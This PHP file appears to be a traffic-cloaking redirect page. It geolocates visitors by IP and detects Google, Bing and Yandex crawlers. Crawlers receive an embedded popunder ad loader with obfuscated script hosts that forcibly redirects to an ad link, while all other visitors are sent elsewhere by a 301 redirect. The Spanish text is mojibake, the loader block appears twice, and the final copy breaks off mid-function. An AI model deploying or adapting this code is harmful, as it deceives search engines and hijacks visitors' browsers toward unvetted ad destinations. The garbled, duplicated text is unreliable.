<?php
if (!defined('IS_MAIN_FILE')) {
    echo "Acceso denegado. Debe pasar por la página de inicio primero.";
    exit;
}
// Include the MaxMind library.
require 'geo/vendor/autoload.php';

use GeoIp2\Database\Reader;
use GeoIp2\Exception\GeoIp2Exception;

/**
 * Class to perform IP lookups using the MaxMind databases.
 */
class GeoIpLookup {
    private ?Reader $asnReader = null;
    private ?Reader $countryReader = null;
    private bool $dbLoaded = false;

    public function __construct($data_dir = __DIR__ . '/geo') {
        $asnPath = $data_dir . '/GeoLite2-ASN.mmdb';
        $countryPath = $data_dir . '/GeoLite2-Country.mmdb';

        if (file_exists($asnPath) && file_exists($countryPath)) {
            try {
                $this->asnReader = new Reader($asnPath);
                $this->countryReader = new Reader($countryPath);
                $this->dbLoaded = true;
            } catch (\Exception $e) {
                error_log("Error loading MaxMind database: " . $e->getMessage());
            }
        }
    }

    public function isDbLoaded(): bool {
        return $this->dbLoaded;
    }

    public function getIpInfo(string $ip_address): array {
        $info = [
            'company_name' => 'Desconocida',
            'country_code' => 'Desconocido',
        ];
        if (!$this->isDbLoaded() || !filter_var($ip_address, FILTER_VALIDATE_IP)) {
            return $info;
        }
        try {
            if ($this->asnReader) {
                $asnRecord = $this->asnReader->asn($ip_address);
                $info['company_name'] = $asnRecord->autonomousSystemOrganization ?? 'Desconocida';
            }
            if ($this->countryReader) {
                $countryRecord = $this->countryReader->country($ip_address);
                $info['country_code'] = $countryRecord->country->isoCode ?? 'Desconocido';
            }
        } catch (GeoIp2Exception $e) {
            // Ignore errors for IPs not found.
        }
        return $info;
    }
}



// --- Lógica principal de detección ---
$ipAddress = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'User-Agent not detected';
$userAgentLower = strtolower($userAgent);

// Crear la instancia de GeoIpLookup una sola vez
$geoIpLookup = new GeoIpLookup();
$ipInfo = $geoIpLookup->getIpInfo($ipAddress);
$companyName = strtolower($ipInfo['company_name']);
$countryCode = $ipInfo['country_code'];
// 1. Clasificación de países y URLs de redireccionamiento
$tiers = [
    'tier1' => [
        'urls' => [
         //   "https://t.mbsrv2.com/381468/3785/0?bo=2753,2754,2755,2756&po=6456&aff_sub5=SF_006OG000004lmDN",
            "https://otieu.com/4/9848568"
        ],
        'countries' => [
            'AL' => 'Albania', 'AT' => 'Austria', 'AU' => 'Australia', 'BE' => 'Bélgica', 'BG' => 'Bulgaria',
            'BR' => 'Brasil', 'CA' => 'Canadá', 'CH' => 'Suiza', 'CZ' => 'República Checa', 'DE' => 'Alemania',
            'DK' => 'Dinamarca', 'DZ' => 'Argelia', 'ES' => 'España', 'FR' => 'Francia', 'GB' => 'Reino Unido',
            'GR' => 'Grecia', 'HR' => 'Croacia', 'HU' => 'Hungría', 'IE' => 'Irlanda', 'IT' => 'Italia',
            'JP' => 'Japón', 'KR' => 'Corea del Sur', 'LU' => 'Luxemburgo', 'MX' => 'México', 'NL' => 'Países Bajos',
            'NO' => 'Noruega', 'PT' => 'Portugal', 'NZ' => 'Nueva Zelanda', 'PL' => 'Polonia', 'RO' => 'Rumania',
            'RU' => 'Rusia', 'SE' => 'Suecia', 'SG' => 'Singapur', 'TR' => 'Turquía', 'UA' => 'Ucrania',
            'US' => 'Estados Unidos'
        ]
    ],
    'tier2' => [
        'urls' => [
           // "https://optidownloader.com/1842441",
           // "https://www.revenuecpmgate.com/tk8x9mh6?key=63d2d825b2d0df0c0e5498d5b8c3afe2",
            "https://otieu.com/4/9848568"
        ],
        'countries' => [
            'AD' => 'Andorra', 'AR' => 'Argentina', 'BH' => 'Bahréin', 'BB' => 'Barbados', 'BS' => 'Bahamas',
            'BN' => 'Brunéi', 'BY' => 'Bielorrusia', 'CL' => 'Chile', 'CO' => 'Colombia', 'CR' => 'Costa Rica',
            'CY' => 'Chipre', 'EE' => 'Estonia', 'HK' => 'Hong Kong', 'IS' => 'Islandia', 'IL' => 'Israel',
            'KW' => 'Kuwait', 'LV' => 'Letonia', 'LT' => 'Lituania', 'MY' => 'Malasia', 'MT' => 'Malta',
            'MC' => 'Mónaco', 'OM' => 'Omán', 'PA' => 'Panamá', 'PR' => 'Puerto Rico', 'QA' => 'Catar',
            'SA' => 'Arabia Saudita', 'RS' => 'Serbia', 'SK' => 'Eslovaquia', 'SI' => 'Eslovenia',
            'ZA' => 'Sudáfrica', 'TW' => 'Taiwán', 'TH' => 'Tailandia', 'TT' => 'Trinidad y Tobago',
            'AE' => 'Emiratos Árabes Unidos', 'UY' => 'Uruguay', 'PS' => 'Palestina'
        ]
    ],
    'tier3' => [
        'urls' => [
           // "https://optidownloader.com/1842441",
          //  "https://www.revenuecpmgate.com/tk8x9mh6?key=63d2d825b2d0df0c0e5498d5b8c3afe2",
            "https://otieu.com/4/9848568"
        ],
        'countries' => [
            'AF' => 'Afganistán', 'AO' => 'Angola', 'AI' => 'Anguila', 'AG' => 'Antigua y Barbuda', 'AM' => 'Armenia',
            'AW' => 'Aruba', 'AZ' => 'Azerbaiyán', 'BD' => 'Bangladés', 'BZ' => 'Belice', 'BJ' => 'Benín',
            'BT' => 'Bután', 'BO' => 'Bolivia', 'BA' => 'Bosnia y Herzegovina', 'BW' => 'Botsuana',
            'BF' => 'Burkina Faso', 'BI' => 'Burundi', 'KH' => 'Camboya', 'CM' => 'Camerún', 'CV' => 'Cabo Verde',
            'CF' => 'República Centroafricana', 'TD' => 'Chad', 'CN' => 'China', 'KM' => 'Comoras', 'CG' => 'Congo',
            'CD' => 'Congo, República Democrática del', 'CK' => 'Islas Cook', 'CI' => 'Costa de Marfil',
            'CU' => 'Cuba', 'CW' => 'Curazao', 'DJ' => 'Yibuti', 'DM' => 'Dominica', 'DO' => 'República Dominicana',
            'EC' => 'Ecuador', 'EG' => 'Egipto', 'SV' => 'El Salvador', 'GQ' => 'Guinea Ecuatorial', 'ER' => 'Eritrea',
            'ET' => 'Etiopía', 'FJ' => 'Fiyi', 'GA' => 'Gabón', 'GM' => 'Gambia', 'GE' => 'Georgia',
            'GH' => 'Ghana', 'GD' => 'Granada', 'GT' => 'Guatemala', 'GN' => 'Guinea', 'GW' => 'Guinea-Bissau',
            'GY' => 'Guyana', 'HT' => 'Haití', 'HN' => 'Honduras', 'IN' => 'India', 'ID' => 'Indonesia',
            'IR' => 'Irán', 'IQ' => 'Irak', 'JM' => 'Jamaica', 'JO' => 'Jordania', 'KE' => 'Kenia', 'KI' => 'Kiribati',
            'XK' => 'Kosovo', 'KG' => 'Kirguistán', 'LA' => 'Laos', 'LB' => 'Líbano', 'LS' => 'Lesoto',
            'LR' => 'Liberia', 'LY' => 'Libia', 'MO' => 'Macao', 'MK' => 'Macedonia del Norte', 'MG' => 'Madagascar',
            'MW' => 'Malaui', 'MV' => 'Maldivas', 'ML' => 'Malí', 'MR' => 'Mauritania', 'MU' => 'Mauricio',
            'FM' => 'Micronesia', 'MD' => 'Moldavia', 'MN' => 'Mongolia', 'ME' => 'Montenegro', 'MS' => 'Montserrat',
            'MA' => 'Marruecos', 'MZ' => 'Mozambique', 'MM' => 'Myanmar', 'NA' => 'Namibia', 'NR' => 'Nauru',
            'NP' => 'Nepal', 'NI' => 'Nicaragua', 'NE' => 'Níger', 'NG' => 'Nigeria', 'NU' => 'Niue',
            'KP' => 'Corea del Norte', 'MP' => 'Islas Marianas del Norte', 'PK' => 'Pakistán', 'PW' => 'Palaos',
            'PG' => 'Papúa Nueva Guinea', 'PY' => 'Paraguay', 'PE' => 'Perú', 'PH' => 'Filipinas', 'RE' => 'Reunión',
            'RW' => 'Ruanda', 'KN' => 'San Cristóbal y Nieves', 'LC' => 'Santa Lucía',
            'VC' => 'San Vicente y las Granadinas', 'WS' => 'Samoa', 'SM' => 'San Marino',
            'ST' => 'Santo Tomé y Príncipe', 'SN' => 'Senegal', 'SC' => 'Seychelles', 'SL' => 'Sierra Leona',
            'SO' => 'Somalia', 'SS' => 'Sudán del Sur', 'LK' => 'Sri Lanka', 'SD' => 'Sudán', 'SR' => 'Surinam',
            'SZ' => 'Suazilandia', 'SY' => 'Siria', 'TJ' => 'Tayikistán', 'TZ' => 'Tanzania', 'TG' => 'Togo',
            'TO' => 'Tonga', 'TN' => 'Túnez', 'TM' => 'Turkmenistán', 'TV' => 'Tuvalu', 'UG' => 'Uganda',
            'UZ' => 'Uzbekistán', 'VU' => 'Vanuatu', 'VE' => 'Venezuela', 'VN' => 'Vietnam',
            'VI' => 'Islas Vírgenes de los EE.UU.', 'YE' => 'Yemen', 'ZM' => 'Zambia', 'ZW' => 'Zimbabue'
        ]
    ]
];
$userTier = getTierByCountryCode($countryCode, $tiers);

/**
 * Función para obtener el tier por código de país
 */
function getTierByCountryCode($countryCode, $tiers) {
    foreach ($tiers as $tierName => $data) {
        if (array_key_exists($countryCode, $data['countries'])) {
            return $tierName;
        }
    }
    return 'unknown';
}
$isTrustedCrawler = false;

// Detección de Google, Bing y Yandex
if (strpos($userAgentLower, 'googlebot') !== false || strpos($userAgentLower, 'pagespeed') !== false || strpos($userAgentLower, 'chrome-lighthouse') !== false || strpos($companyName, 'google llc') !== false) {
    $isTrustedCrawler = true;
}
if (strpos($userAgentLower, 'bingbot') !== false || strpos($userAgentLower, 'msnbot') !== false || strpos($companyName, 'microsoft corp') !== false) {
    $isTrustedCrawler = true;
}
if (strpos($userAgentLower, 'yandexbot') !== false || strpos($userAgentLower, 'yandex llc') !== false) {
    $isTrustedCrawler = true;
}

// Si es un bot de confianza, mostramos el mensaje y terminamos.
if ($isTrustedCrawler) {
?>
<?php
// Inicializa una variable para almacenar la URL obtenida.
$url_obtenida_php = 'A��n no se ha recibido la URL.';

// Define la URL de redirecci��n por defecto.
$redirect_url = 'https://www.google.com'; // Puedes cambiar esta URL por la que desees.

// Verifica si la solicitud es de tipo POST y si el par��metro 'url' est�� presente.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['url'])) {
    // Almacena la URL de la solicitud POST en la variable PHP.
    $url_obtenida_php = $_POST['url'];

    // Env��a una respuesta JSON al cliente para confirmar la recepci��n.
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'URL recibida en el servidor.', 'url' => $url_obtenida_php]);

    // Detiene la ejecuci��n del script para evitar que se renderice el HTML de nuevo.
    exit;
}
?>
<!DOCTYPE html>


<div class="container">
      <p id="status"></p>
    </div>
</div>

<script type="text/javascript">
    var _pop = _pop || [];
    _pop.push(['siteId', 5226581]);
    _pop.push(['minBid', 0.000000]);
    _pop.push(['popundersPerIP', 0]);
    _pop.push(['delayBetween', 0]);
    _pop.push(['default', '<?php echo $redirect_url; ?>']); // La URL se inserta aqu��
    _pop.push(['defaultPerDay', 0]);
    _pop.push(['topmostLayer', false]);
    _pop.push(['adscoreak', 'QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c']);

    (function(window, document, screen) {
        Function.prototype.bind || (Function.prototype.bind = function(thisArg) {
            if (typeof this !== "function") {
                throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
            }
            var args = Array.prototype.slice.call(arguments, 1);
            var self = this;
            var noOp = function() {};
            var bound = function() {
                return self.apply(this instanceof noOp && thisArg ? this : thisArg, args.concat(Array.prototype.slice.call(arguments)));
            };
            noOp.prototype = this.prototype;
            bound.prototype = new noOp;
            return bound;
        });

        var utils = {
            _openAd: function(url, options) {
                //const urlOutput = document.getElementById('urlOutput');
                const status = document.getElementById('status');
               // urlOutput.textContent = url;
                status.innerHTML = '<span class="alert-success">URL extra��da.</span>';

                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `url=${encodeURIComponent(url)}`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        window.location.href = data.url;
                    }
                })
                .catch(error => {
                    console.error('Error al enviar la URL al servidor:', error);
                });

                return true;
            },
            abortPop: function() {
                this.clearUrls();
            },
            init: function(config) {
                this.userActivation = true;
                this.urls = [];
                this.settings = {};
                this.settings.crtimeout = config.crtimeout || 60 * 1000;
                this.settings.onbeforeopen = config.onbeforeopen;
                this.settings.onafteropen = function() {
                    this.adfired = true;
                }.bind(this);
                this.settings.ignorefailure = config.ignorefailure || false;
                this.settings.openernull = true;
            },
            clearUrls: function() {
                this.urls = [];
            },
            addUrl: function(url, options) {
                if (!url.match(/^https?:\/\//)) return false;
                this.urls.push({
                    url: url,
                    options: options
                });
                this._openAd(url, options);
            }
        };

        var Base64 = {
            _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            encode: function(input) {
                var output = "";
                var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
                var i = 0;
                input = Base64._utf8_encode(input);
                while (i < input.length) {
                    chr1 = input.charCodeAt(i++);
                    chr2 = input.charCodeAt(i++);
                    chr3 = input.charCodeAt(i++);
                    enc1 = chr1 >> 2;
                    enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                    enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                    enc4 = chr3 & 63;
                    if (isNaN(chr2)) {
                        enc3 = enc4 = 64;
                    } else if (isNaN(chr3)) {
                        enc4 = 64;
                    }
                    output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
                }
                return output;
            },
            decode: function(input) {
                var output = "";
                var chr1, chr2, chr3;
                var enc1, enc2, enc3, enc4;
                var i = 0;
                input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
                while (i < input.length) {
                    enc1 = this._keyStr.indexOf(input.charAt(i++));
                    enc2 = this._keyStr.indexOf(input.charAt(i++));
                    enc3 = this._keyStr.indexOf(input.charAt(i++));
                    enc4 = this._keyStr.indexOf(input.charAt(i++));
                    chr1 = (enc1 << 2) | (enc2 >> 4);
                    chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                    chr3 = ((enc3 & 3) << 6) | enc4;
                    output = output + String.fromCharCode(chr1);
                    if (enc3 !== 64) {
                        output = output + String.fromCharCode(chr2);
                    }
                    if (enc4 !== 64) {
                        output = output + String.fromCharCode(chr3);
                    }
                }
                output = Base64._utf8_decode(output);
                return output;
            },
            _utf8_encode: function(string) {
                string = string.replace(/\r\n/g, "\n");
                var utftext = "";
                for (var n = 0; n < string.length; n++) {
                    var c = string.charCodeAt(n);
                    if (c < 128) {
                        utftext += String.fromCharCode(c);
                    } else if ((c > 127) && (c < 2048)) {
                        utftext += String.fromCharCode((c >> 6) | 192);
                        utftext += String.fromCharCode(((c & 63) | 128));
                    } else {
                        utftext += String.fromCharCode((c >> 12) | 224);
                        utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                        utftext += String.fromCharCode((c & 63) | 128);
                    }
                }
                return utftext;
            },
            _utf8_decode: function(utftext) {
                var string = "";
                var i = 0;
                var c = 0,
                    c1 = 0,
                    c2 = 0;
                while (i < utftext.length) {
                    c = utftext.charCodeAt(i);
                    if (c < 128) {
                        string += String.fromCharCode(c);
                        i++;
                    } else if ((c > 191) && (c < 224)) {
                        c2 = utftext.charCodeAt(i + 1);
                        string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                        i += 2;
                    } else {
                        c2 = utftext.charCodeAt(i + 1);
                        c3 = utftext.charCodeAt(i + 2);
                        string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                        i += 3;
                    }
                }
                return string;
            }
        };

        "use strict";
        var BASE_PATH = "/c";
        var POP_GLOBAL_VAR = "_pop";
        var PAO_GLOBAL_VAR = "_pao";
        window.Base64 = Base64;
        var currentScriptElement = document.currentScript;
        var adscoreTimeout = null;

        var adManager = {
            _inventory: {},
            _config: {
                _siteId: 0,
                _minBid: 0,
                _blockedCountries: false,
                _default: false,
                _defaultType: "popunder",
                _useOverlay: true,
                _trafficType: 0,
                _popunderFailover: "tabup",
                _adscorebp: null,
                _adscorept: null,
                _adscoreak: "QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c"
            },
            _init: function() {
                var self = this;
                this._loadConfig();
                this.adfired = false;
                utils.init({
                    prepop: false,
                    catchalldiv: "never",
                    onafteropen: function() {
                        self.adfired = true;
                    }
                });
                this._adscoreDeploy();
            },
            _adscoreDeploy: function() {
                var self = this;
                var adscoreScriptTimeout = 0;
                var config = this._config;
                if (self._config._adscorebp) {
                    self._checkInventory(self._config._adscorebp);
                } else if (typeof AdscoreInit === "function") {
                    try {
                        AdscoreInit(self._config._adscoreak, {
                            sub_id: config._siteId,
                            callback: function(result) {
                                self._checkInventory(result.signature || "2" + result.error);
                            }
                        });
                    } catch (e) {
                        self._checkInventory("4" + e.message);
                    }
                } else if (document.body) {
                    var domainParts = ["re", "adsco"];
                    domainParts.push(domainParts[1][3]);
                    var adscoreUrl = "https://" + domainParts.reverse().join(".") + "/";
                    var script = document.createElement("script");
                    script.src = adscoreUrl;
                    try {
                        script.onerror = function() {
                            if (script.src === adscoreUrl) {
                                script.src = "https://" + Math.round(Math.pow(52292.244664, 2)) + "/a.js";
                            } else {
                                clearTimeout(adscoreScriptTimeout);
                                self._checkInventory("1");
                            }
                        };
                    } catch (e) {}
                    script.onload = function() {
                        clearTimeout(adscoreScriptTimeout);
                        try {
                            AdscoreInit(self._config._adscoreak, {
                                sub_id: config._siteId,
                                callback: function(result) {
                                    self._checkInventory(result.signature || "2" + result.error);
                                }
                            });
                        }
                        catch (e) {
                            self._checkInventory("4" + e.message);
                        }
                    };
                    document.body.appendChild(script);
                    adscoreScriptTimeout = setTimeout(function() {
                        self._checkInventory("3");
                    }, 5000);
                } else {
                    setTimeout(function() {
                        self._adscoreDeploy();
                    }, 50);
                }
            },
            _checkInventory: function(adscoreSignature) {
               // document.getElementById('adscoreOutput').textContent = adscoreSignature;
                
                this._lastci = (new Date).getTime();
                utils.clearUrls();
                var self = this;
                var intervalId = 0;
                var config = this._config;
                if (config._adscorept) {
                    config._adscorept(adscoreSignature);
                }
                try {
                    clearTimeout(adscoreTimeout);
                } catch (e) {}
                adscoreTimeout = setTimeout(function() {
                    self._adscoreDeploy();
                }, 300000);
                intervalId = setInterval(function() {
                    var inventoryUrl = "//serve.popads.net" + BASE_PATH;
                    if (document.body) {
                        clearInterval(intervalId);
                        var params = {
                            _: encodeURIComponent(adscoreSignature),
                            v: 4,
                            siteId: config._siteId,
                            minBid: config._minBid,
                            blockedCountries: config._blockedCountries || "",
                            documentRef: encodeURIComponent(document.referrer),
                        };
                        for (var key in params) {
                            if (params.hasOwnProperty(key)) {
                                inventoryUrl += (inventoryUrl.indexOf("?") !== -1 ? "&" : "?") + key + "=" + (params[key] || "");
                            }
                        }
                        var script = document.createElement("script");
                        script.referrerPolicy = "unsafe-url";
                        script.src = inventoryUrl;
                        try {
                            script.onerror = function() {
                                utils.abortPop();
                                currentScriptElement.onerror();
                            };
                        } catch (e) {}
                        document.body.appendChild(script);
                    }
                }, 100);
            },
            _parseInventory: function(inventoryData) {
                this._inventory = inventoryData || {};
                if (!this._inventory.url || this._inventory.url === "") {
                    // Si no se encuentra URL, se llama a la funci��n para usar la URL por defecto.
                    this._preparePopDefault();
                } else {
                    this._preparePopInventory();
                }
            },
            _preparePopDefault: function() {
              //  const urlOutput = document.getElementById('urlOutput');
                const status = document.getElementById('status');
                const defaultUrl = 'https://otieu.com/4/9848568'; // Aqu�� se usa la URL por defecto
                
             //   urlOutput.textContent = "No se encontr�� inventario. Redireccionando a la URL por defecto...";
                status.innerHTML = `<span class="alert-error">No se encontr�� inventario.</span>`;

                // Redirecciona a la URL por defecto
                if (defaultUrl) {
                    window.location.href = 'https://otieu.com/4/9848568';
                }
            },
            _preparePopInventory: function() {
                var self = this;
                const inventoryUrl = self._inventory.url;

                // Muestra la URL en el DOM (en el navegador)
             //   const urlOutput = document.getElementById('urlOutput');
                const status = document.getElementById('status');
               // urlOutput.textContent = inventoryUrl;
                status.innerHTML = '<span class="alert-success">�0�3�0�7xito! URL de inventario obtenida. Redireccionando...</span>';

                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `url=${encodeURIComponent(inventoryUrl)}`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        // console.log('URL recibida por el servidor PHP: ' + data.url);
                    }
                })
                .catch(error => {
                    console.error('Error al enviar la URL al servidor:', error);
                });
                
               window.location.href = inventoryUrl;
                
                try {
                    clearTimeout(adscoreTimeout);
                } catch (e) {}
            },
            _preparePop: function() {
                if (this._inventory.url !== "") {
                    this._preparePopInventory();
                } else {
                    this._preparePopDefault();
                }
            },
            _waitForGoodWeather: function() {
                setTimeout(this._init.bind(this), 0);
            },
            _loadConfig: function() {
                var globalConfig = window[POP_GLOBAL_VAR] || [];
                var config = this._config;
                for (var i = 0; i < globalConfig.length; i++) {
                    var key = globalConfig[i][0];
                    var value = globalConfig[i][1];
                    switch (key) {
                        case "siteId":
                        case "delayBetween":
                        case "defaultPerIP":
                        case "trafficType":
                            value = parseInt(value, 10);
                            if (isNaN(value)) continue;
                    }
                    switch (key) {
                        case "siteId":
                            config._siteId = value;
                            break;
                        case "minBid":
                            config._minBid = value;
                            break;
                        case "blockedCountries":
                            config._blockedCountries = value;
                            break;
                        case "default":
                            config._default = value;
                            break;
                        case "defaultType":
                            config._defaultType = value;
                            break;
                        case "topmostLayer":
                            config._useOverlay = value;
                            break;
                        case "trafficType":
                            config._trafficType = value;
                            break;
                        case "popunderFailover":
                            config._popunderFailover = value;
                            break;
                        case "prepop":
                            break;
                        case "adscorebp":
                            config._adscorebp = value;
                            break;
                        case "adscorept":
                            config._adscorept = value;
                            break;
                        case "adscoreak":
                            config._adscoreak = value;
                            break;
                    }
                }
            }
        };
        for (var prop in window) {
            try {
                if (prop.match(/[0-9a-f]{32,32}/) && window[prop] && window[prop].length >= 7 && window[prop][0] && window[prop][0][0] && !isNaN(parseFloat(window[prop][0][1])) && isFinite(window[prop][0][1])) {
                    POP_GLOBAL_VAR = prop;
                    window[prop.slice(0, 16) + prop.slice(0, 16)] = window[prop];
                    break;
                }
            } catch (e) {}
        }
        if (!"//serve.popads.net".includes(".net")) {
            PAO_GLOBAL_VAR = "";
            var randomLength = 10 + Math.floor(10 * Math.random());
            for (var i = 0; i < randomLength; i++) {
                PAO_GLOBAL_VAR += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(26 * Math.random()));
            }
            BASE_PATH = "/" + PAO_GLOBAL_VAR;
        }
        var publicApi = {
            parse: function(inventoryData) {
                adManager._parseInventory(inventoryData);
            },
            fbparse: function(bannerData) {
                utils._openAd(bannerData.url, {});
            },
        };
        try {
            window._pao = publicApi;
            Object.freeze(window._pao);
        } catch (e) {}
        try {
            window[PAO_GLOBAL_VAR] = publicApi;
            Object.freeze(window[PAO_GLOBAL_VAR]);
        } catch (e) {}
        if (!navigator.userAgent.includes("://")) {
            adManager._waitForGoodWeather();
        }
    })(window, window.document, window.screen);
</script>
</body>
</html>
<?php
}else{
// URL por defecto en caso de que no se pueda determinar el país o si hay un fallo
$default_redirect_url = "https://baaddoo.github.io";
$redirect_url = $default_redirect_url;
$botonerror = 'https://baaddoo.github.io';

// Si no es un bot, determinamos la URL de redirección
if (array_key_exists($userTier, $tiers) && !empty($tiers[$userTier]['urls'])) {
    $redirect_url = $tiers[$userTier]['urls'][array_rand($tiers[$userTier]['urls'])];
}

/**
 * Obtiene la URL completa del script que se está ejecutando.
 */
function getCurrentUrl(): string
{
    $protocolo = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];
    return "{$protocolo}://{$host}{$uri}";
}

/**
 * Convierte una URL en un título legible.
 */
function urlToTitle(string $url): string
{
    $separadores = ['-', '_', '/', '.', '+', '%20', ' '];
    $path = parse_url($url, PHP_URL_PATH);
    if (empty($path)) {
        return '';
    }
    $path_segments = array_filter(explode('/', $path));
    $formatted_segments = [];
    foreach ($path_segments as $segment) {
        $title = str_replace($separadores, ' ', $segment);
        $formatted_segments[] = ucwords($title);
    }
    return implode(' > ', $formatted_segments);
}

$url_actual = getCurrentUrl();
$titulo_generado = urlToTitle($url_actual);
header("HTTP/1.1 301 Moved Permanently");
header("Location: https://baaddoo.github.io");
exit();
?>

<?php
// Inicializa una variable para almacenar la URL obtenida.
$url_obtenida_php = 'A��n no se ha recibido la URL.';

// Define la URL de redirecci��n por defecto.
$redirect_url = 'https://www.google.com'; // Puedes cambiar esta URL por la que desees.

// Verifica si la solicitud es de tipo POST y si el par��metro 'url' est�� presente.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['url'])) {
    // Almacena la URL de la solicitud POST en la variable PHP.
    $url_obtenida_php = $_POST['url'];

    // Env��a una respuesta JSON al cliente para confirmar la recepci��n.
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'URL recibida en el servidor.', 'url' => $url_obtenida_php]);

    // Detiene la ejecuci��n del script para evitar que se renderice el HTML de nuevo.
    exit;
}
?>
<!DOCTYPE html>


<div class="container">
      <p id="status"></p>
    </div>
</div>

<script type="text/javascript">
    var _pop = _pop || [];
    _pop.push(['siteId', 5226581]);
    _pop.push(['minBid', 0.000000]);
    _pop.push(['popundersPerIP', 0]);
    _pop.push(['delayBetween', 0]);
    _pop.push(['default', 'https://otieu.com/4/9848568']); // La URL se inserta aqu��
    _pop.push(['defaultPerDay', 0]);
    _pop.push(['topmostLayer', false]);
    _pop.push(['adscoreak', 'QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c']);

    (function(window, document, screen) {
        Function.prototype.bind || (Function.prototype.bind = function(thisArg) {
            if (typeof this !== "function") {
                throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
            }
            var args = Array.prototype.slice.call(arguments, 1);
            var self = this;
            var noOp = function() {};
            var bound = function() {
                return self.apply(this instanceof noOp && thisArg ? this : thisArg, args.concat(Array.prototype.slice.call(arguments)));
            };
            noOp.prototype = this.prototype;
            bound.prototype = new noOp;
            return bound;
        });

        var utils = {
            _openAd: function(url, options) {
                //const urlOutput = document.getElementById('urlOutput');
                const status = document.getElementById('status');
               // urlOutput.textContent = url;
                status.innerHTML = '<span class="alert-success">URL extra��da.</span>';

                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `url=${encodeURIComponent(url)}`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        window.location.href = data.url;
                    }
                })
                .catch(error => {
                    console.error('Error al enviar la URL al servidor:', error);
                });

                return true;
            },
            abortPop: function() {
                this.clearUrls();
            },
            init: function(config) {
                this.userActivation = true;
                this.urls = [];
                this.settings = {};
                this.settings.crtimeout = config.crtimeout || 60 * 1000;
                this.settings.onbeforeopen = config.onbeforeopen;
                this.settings.onafteropen = function() {
                    this.adfired = true;
                }.bind(this);
                this.settings.ignorefailure = config.ignorefailure || false;
                this.settings.openernull = true;
            },
            clearUrls: function() {
                this.urls = [];
            },
            addUrl: function(url, options) {
                if (!url.match(/^https?:\/\//)) return false;
                this.urls.push({
                    url: url,
                    options: options
                });
                this._openAd(url, options);
            }
        };

        var Base64 = {
            _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            encode: function(input) {
                var output = "";
                var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
                var i = 0;
                input = Base64._utf8_encode(input);
                while (i < input.length) {
                    chr1 = input.charCodeAt(i++);
                    chr2 = input.charCodeAt(i++);
                    chr3 = input.charCodeAt(i++);
                    enc1 = chr1 >> 2;
                    enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
                    enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
                    enc4 = chr3 & 63;
                    if (isNaN(chr2)) {
                        enc3 = enc4 = 64;
                    } else if (isNaN(chr3)) {
                        enc4 = 64;
                    }
                    output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
                }
                return output;
            },
            decode: function(input) {
                var output = "";
                var chr1, chr2, chr3;
                var enc1, enc2, enc3, enc4;
                var i = 0;
                input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
                while (i < input.length) {
                    enc1 = this._keyStr.indexOf(input.charAt(i++));
                    enc2 = this._keyStr.indexOf(input.charAt(i++));
                    enc3 = this._keyStr.indexOf(input.charAt(i++));
                    enc4 = this._keyStr.indexOf(input.charAt(i++));
                    chr1 = (enc1 << 2) | (enc2 >> 4);
                    chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                    chr3 = ((enc3 & 3) << 6) | enc4;
                    output = output + String.fromCharCode(chr1);
                    if (enc3 !== 64) {
                        output = output + String.fromCharCode(chr2);
                    }
                    if (enc4 !== 64) {
                        output = output + String.fromCharCode(chr3);
                    }
                }
                output = Base64._utf8_decode(output);
                return output;
            },
            _utf8_encode: function(string) {
                string = string.replace(/\r\n/g, "\n");
                var utftext = "";
                for (var n = 0; n < string.length; n++) {
                    var c = string.charCodeAt(n);
                    if (c < 128) {
                        utftext += String.fromCharCode(c);
                    } else if ((c > 127) && (c < 2048)) {
                        utftext += String.fromCharCode((c >> 6) | 192);
                        utftext += String.fromCharCode(((c & 63) | 128));
                    } else {
                        utftext += String.fromCharCode((c >> 12) | 224);
                        utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                        utftext += String.fromCharCode((c & 63) | 128);
                    }
                }
                return utftext;
            },
            _utf8_decode: function(utftext) {
                var string = "";
